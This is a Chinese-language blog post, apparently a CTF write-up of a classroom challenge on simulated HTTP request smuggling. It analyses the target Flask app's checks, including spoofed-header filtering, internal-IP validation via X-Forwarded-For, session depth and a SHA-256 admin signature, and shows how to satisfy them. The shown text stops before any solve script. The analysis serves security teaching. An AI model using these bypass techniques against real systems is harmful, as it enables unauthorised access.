@@ -1,0 +1,567 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 8.0.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/meow.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/meow.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta name="google-site-verification" content="ytiTpj8Ol2naa1JDTwZxRYelNQFe4fgRvG5XcJmZ9N0">
+  <meta name="msvalidate.01" content="2B6959B722A9727D346D9795E31C5112">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"mintind.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.27.0","exturl":true,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"always","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"tokyo-night-dark","dark":"tokyo-night-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":"flat"},"fold":{"enable":true,"height":500},"language":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="课堂测试题">
+<meta property="og:type" content="article">
+<meta property="og:title" content="smuggle应用层模拟请求走私">
+<meta property="og:url" content="https://mintind.github.io/2026/04/08/CTF/Web/smuggle-web2/index.html">
+<meta property="og:site_name" content="Mintind&#39;s Blog">
+<meta property="og:description" content="课堂测试题">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-04-08T16:00:00.000Z">
+<meta property="article:modified_time" content="2026-08-16T18:01:36.124Z">
+<meta property="article:author" content="Mintind">
+<meta property="article:tag" content="Web">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://mintind.github.io/2026/04/08/CTF/Web/smuggle-web2/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://mintind.github.io/2026/04/08/CTF/Web/smuggle-web2/","path":"2026/04/08/CTF/Web/smuggle-web2/","title":"smuggle应用层模拟请求走私"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>smuggle应用层模拟请求走私 | Mintind's Blog</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script><script src="/js/bookmark.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Mintind's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">此心安处是吾乡</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">60</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">16</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">80</span></a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B"><span class="nav-number">1.</span> <span class="nav-text">解题过程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="nav-number">1.1.</span> <span class="nav-text">源码分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E6%8F%90%E5%8D%87depth"><span class="nav-number">1.2.</span> <span class="nav-text">如何提升depth</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AE%A1%E7%AE%97%E5%85%B3%E9%94%AE%E5%8F%98%E9%87%8F-trace-bytes"><span class="nav-number">1.3.</span> <span class="nav-text">计算关键变量 trace_bytes</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E8%A7%A3%E6%80%9D%E8%B7%AF"><span class="nav-number">1.4.</span> <span class="nav-text">题解思路</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8A%80%E6%9C%AF%E7%82%B9%E6%80%BB%E7%BB%93"><span class="nav-number">2.</span> <span class="nav-text">技术点总结</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Mintind</p>
+  <div class="site-description" itemprop="description">Record to Remember</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">80</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">60</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL21pbnRpbmQ=" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;mintind"><i class="fab fa-github fa-fw"></i>GitHub</span>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://mintind.github.io/2026/04/08/CTF/Web/smuggle-web2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Mintind">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Mintind's Blog">
+      <meta itemprop="description" content="Record to Remember">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="smuggle应用层模拟请求走私 | Mintind's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          smuggle应用层模拟请求走私<span class="exturl post-edit-link" data-url="aHR0cHM6Ly9naXRodWIuY29tL01pbnRpbmQvbWludGluZC1oZXhvLWJsb2cvZWRpdC9tYWluL3NvdXJjZS9fcG9zdHMvQ1RGL1dlYi9zbXVnZ2xlLXdlYjIubWQ=" title="编辑"><i class="fa fa-pen-nib"></i></span>
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2026-04-09 00:00:00" itemprop="dateCreated datePublished" datetime="2026-04-09T00:00:00+08:00">2026-04-09</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-08-17 02:01:36" itemprop="dateModified" datetime="2026-08-17T02:01:36+08:00">2026-08-17</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>1.9k</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>课堂测试题</p>
+<span id="more"></span>
+
+<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><blockquote>
+<p>使用Gemini辅助分析和写脚本</p>
+</blockquote>
+<h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><p>app.py里搜索flag，发现只有路由&#x2F;api&#x2F;v1&#x2F;data会返回flag：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/api/v1/data&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">api_data</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        body = request.get_data(as_text=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> body <span class="keyword">and</span> <span class="string">&#x27;\r\n\r\n&#x27;</span> <span class="keyword">in</span> body:</span><br><span class="line">            lines = body.split(<span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> lines <span class="keyword">and</span> lines[<span class="number">0</span>].startswith((<span class="string">&#x27;GET &#x27;</span>, <span class="string">&#x27;POST &#x27;</span>)):</span><br><span class="line">                smuggled_method, smuggled_path = lines[<span class="number">0</span>].split(<span class="string">&#x27; &#x27;</span>)[:<span class="number">2</span>]</span><br><span class="line">    		</span><br><span class="line">            ...</span><br><span class="line">                            <span class="keyword">return</span> jsonify(&#123;</span><br><span class="line">                            <span class="string">&quot;status&quot;</span>: <span class="string">&quot;ok&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;flag&quot;</span>: FLAG,</span><br><span class="line">                            <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Access granted&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;timestamp&quot;</span>: <span class="built_in">int</span>(time.time())</span><br><span class="line">                        &#125;), <span class="number">200</span></span><br></pre></td></tr></table></figure>
+
+<p>这是一个HTTP请求走私检测与利用接口。接下来分析到达这个分支的条件</p>
+<ol>
+<li>需要是管理员路径，符合才会提取参数，即路径需要为’&#x2F;admin&#x2F;report’</li>
+</ol>
+  <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ADMIN_PATH = <span class="string">&#x27;/admin/report&#x27;</span></span><br><span class="line">----</span><br><span class="line"><span class="keyword">if</span> smuggled_path == ADMIN_PATH:</span><br><span class="line">    smuggled_ip = smuggled_headers.get(<span class="string">&#x27;X-Forwarded-For&#x27;</span>)</span><br><span class="line">    offset_header = smuggled_headers.get(OFFSET_HEADER)</span><br><span class="line">    trace_header = smuggled_headers.get(ADMIN_PROOF_HEADER)</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li><p>检测并拒绝可疑的代理头</p>
+ <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">suspicious_headers = [</span><br><span class="line">    <span class="string">&#x27;A-Forwarded-For&#x27;</span>, <span class="string">&#x27;Forwarded-For-Bypass&#x27;</span>, <span class="string">&#x27;X-Custom-Forwarded-For&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;For-Forwarded&#x27;</span>, <span class="string">&#x27;A-For-Forwarded&#x27;</span>, <span class="string">&#x27;X-Forwarded-For-Original&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Forwarded-For&#x27;</span>, <span class="string">&#x27;X-Real-IP&#x27;</span>, <span class="string">&#x27;X-Client-IP&#x27;</span>, <span class="string">&#x27;Client-IP&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;X-Original-Forwarded-For&#x27;</span>, <span class="string">&#x27;Forwarded&#x27;</span>, <span class="string">&#x27;True-Client-IP&#x27;</span></span><br><span class="line">]</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> sus_header <span class="keyword">in</span> suspicious_headers:</span><br><span class="line">    <span class="keyword">if</span> sus_header <span class="keyword">in</span> smuggled_headers:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;ok&quot;</span>, <span class="string">&quot;processed&quot;</span>: <span class="literal">False</span>, <span class="string">&quot;timestamp&quot;</span>: <span class="built_in">int</span>(time.time())&#125;), <span class="number">200</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>trace_bytes是否正确</p>
+ <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">actual_trace_bytes = get_proxy_trace_bytes(request.headers)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">int</span>(offset_header) != actual_trace_bytes:</span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;processed&quot;</span>: <span class="literal">False</span>&#125;)</span><br></pre></td></tr></table></figure>
+
+<p> 其中get_proxy_trace_bytes是计算了PROXY_TRACE_HEADERS列表中的header总长</p>
+ <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_proxy_trace_bytes</span>(<span class="params">headers</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span>(</span><br><span class="line">        <span class="built_in">len</span>(<span class="string">f&quot;<span class="subst">&#123;header&#125;</span>: <span class="subst">&#123;headers.get(header)&#125;</span>\r\n&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> header <span class="keyword">in</span> PROXY_TRACE_HEADERS</span><br><span class="line">        <span class="keyword">if</span> headers.get(header)</span><br><span class="line">    )</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>管理员ip和session验证，签名验证：is_admin_ip()检查是否是管理员ip，check_session_ready检查会话有效性，最后检查签名</p>
+ <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> smuggled_ip <span class="keyword">and</span> is_admin_ip(smuggled_ip):</span><br><span class="line">    cookie_header = smuggled_headers.get(<span class="string">&#x27;Cookie&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    session_token = <span class="literal">None</span></span><br><span class="line">    smuggled_user_id = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> part <span class="keyword">in</span> cookie_header.split(<span class="string">&#x27;;&#x27;</span>):</span><br><span class="line">        part = part.strip()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;session_token=&#x27;</span> <span class="keyword">in</span> part:</span><br><span class="line">            session_token = part.split(<span class="string">&#x27;=&#x27;</span>, <span class="number">1</span>)[<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27;user_id=&#x27;</span> <span class="keyword">in</span> part:</span><br><span class="line">            smuggled_user_id = part.split(<span class="string">&#x27;=&#x27;</span>, <span class="number">1</span>)[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> check_session_ready(session_token, smuggled_user_id):</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;ok&quot;</span>, <span class="string">&quot;processed&quot;</span>: <span class="literal">False</span>, <span class="string">&quot;timestamp&quot;</span>: <span class="built_in">int</span>(time.time())&#125;), <span class="number">200</span></span><br><span class="line"></span><br><span class="line">    expected_signature = build_admin_signature(</span><br><span class="line">        smuggled_user_id,</span><br><span class="line">        session_token,</span><br><span class="line">        actual_trace_bytes,</span><br><span class="line">        smuggled_method,</span><br><span class="line">        smuggled_path</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> trace_header != expected_signature:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;ok&quot;</span>, <span class="string">&quot;processed&quot;</span>: <span class="literal">False</span>, <span class="string">&quot;timestamp&quot;</span>: <span class="built_in">int</span>(time.time())&#125;), <span class="number">200</span></span><br></pre></td></tr></table></figure></li>
+</ol>
+<p>is_admin_ip函数实际上是检查是不是内网ip。</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">is_admin_ip</span>(<span class="params">ip</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> ip:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    ip = <span class="built_in">str</span>(ip).strip()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;,&#x27;</span> <span class="keyword">in</span> ip:</span><br><span class="line">        ip = ip.split(<span class="string">&#x27;,&#x27;</span>)[<span class="number">0</span>].strip()</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">        ip.startswith(<span class="string">&#x27;127.&#x27;</span>)</span><br><span class="line">        <span class="keyword">or</span> ip.startswith(<span class="string">&#x27;10.&#x27;</span>)</span><br><span class="line">        <span class="keyword">or</span> ip.startswith(<span class="string">&#x27;192.168.&#x27;</span>)</span><br><span class="line">        <span class="keyword">or</span> ip.startswith(<span class="string">&#x27;172.16.&#x27;</span>)</span><br><span class="line">    )</span><br></pre></td></tr></table></figure>
+
+<p>处理逻辑是先标准化，只提取第一个ip，通过ip前缀判断是否来自内网</p>
+<table>
+<thead>
+<tr>
+<th>前缀</th>
+<th>完整范围</th>
+<th>CIDR</th>
+<th>类型</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>127.</code></td>
+<td>127.0.0.0 - 127.255.255.255</td>
+<td>127.0.0.0&#x2F;8</td>
+<td>本地回环（localhost）</td>
+</tr>
+<tr>
+<td><code>10.</code></td>
+<td>10.0.0.0 - 10.255.255.255</td>
+<td>10.0.0.0&#x2F;8</td>
+<td>A类私有地址</td>
+</tr>
+<tr>
+<td><code>192.168.</code></td>
+<td>192.168.0.0 - 192.168.255.255</td>
+<td>192.168.0.0&#x2F;16</td>
+<td>C类私有地址</td>
+</tr>
+<tr>
+<td><code>172.16.</code></td>
+<td>172.16.0.0 - 172.31.255.255</td>
+<td>172.16.0.0&#x2F;12</td>
+<td>B类私有地址</td>
+</tr>
+</tbody></table>
+<p>check_session_ready的要求是session的depth需要&gt;&#x3D; 2</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">check_session_ready</span>(<span class="params">token, user_id</span>):</span><br><span class="line">    session = load_session(user_id, token)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bool</span>(session <span class="keyword">and</span> session.get(<span class="string">&#x27;depth&#x27;</span>, <span class="number">0</span>) &gt;= <span class="number">2</span>)</span><br></pre></td></tr></table></figure>
+
+<p>build_admin_signature用user_id、token等参数通过sha256生成管理员签名</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">build_admin_signature</span>(<span class="params">user_id, token, trace_bytes, method, path</span>):</span><br><span class="line">    seed = <span class="string">f&quot;<span class="subst">&#123;user_id&#125;</span>:<span class="subst">&#123;token&#125;</span>:<span class="subst">&#123;trace_bytes&#125;</span>:<span class="subst">&#123;method&#125;</span>:<span class="subst">&#123;path&#125;</span>:admin:v2&quot;</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.sha256(seed.encode()).hexdigest()[:<span class="number">24</span>]</span><br></pre></td></tr></table></figure>
+
+<p>要成功获取flag，需要通过上面所有检查</p>
+<h3 id="如何提升depth"><a href="#如何提升depth" class="headerlink" title="如何提升depth"></a>如何提升depth</h3><p>搜索分析发现&#x2F;con端点可以将depth提升到1，条件是content_length &gt; 0，即POST报文</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/con&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reserved_names</span>():</span><br><span class="line">    user_id = get_user_id()</span><br><span class="line">    token = create_session_token(user_id)</span><br><span class="line"></span><br><span class="line">    content_length = request.headers.get(<span class="string">&#x27;Content-Length&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> content_length:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">int</span>(content_length) &gt; <span class="number">0</span>:</span><br><span class="line">                bump_session_depth(user_id, token, <span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<p>&#x2F;api&#x2F;v1&#x2F;sync可以将depth提升到2，条件是depth &gt;&#x3D; 1和正确的router key</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/api/v1/sync&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">api_sync</span>():</span><br><span class="line">    user_id = get_user_id()</span><br><span class="line">    session_token = request.cookies.get(<span class="string">&#x27;session_token&#x27;</span>)</span><br><span class="line">    session = load_session(user_id, session_token)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> session <span class="keyword">or</span> session.get(<span class="string">&#x27;depth&#x27;</span>, <span class="number">0</span>) &lt; <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;ok&quot;</span>, <span class="string">&quot;timestamp&quot;</span>: <span class="built_in">int</span>(time.time())&#125;), <span class="number">200</span></span><br><span class="line"></span><br><span class="line">    trace_bytes = get_proxy_trace_bytes(request.headers)</span><br><span class="line">    provided_key = request.headers.get(SYNC_HEADER, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    expected_key = build_route_key(user_id, session_token, trace_bytes)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> provided_key == expected_key:</span><br><span class="line">        bump_session_depth(user_id, session_token, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;ok&quot;</span>, <span class="string">&quot;timestamp&quot;</span>: <span class="built_in">int</span>(time.time())&#125;), <span class="number">200</span></span><br></pre></td></tr></table></figure>
+
+<p>build_route_key逻辑如下，由此可以计算出正确的router key</p>
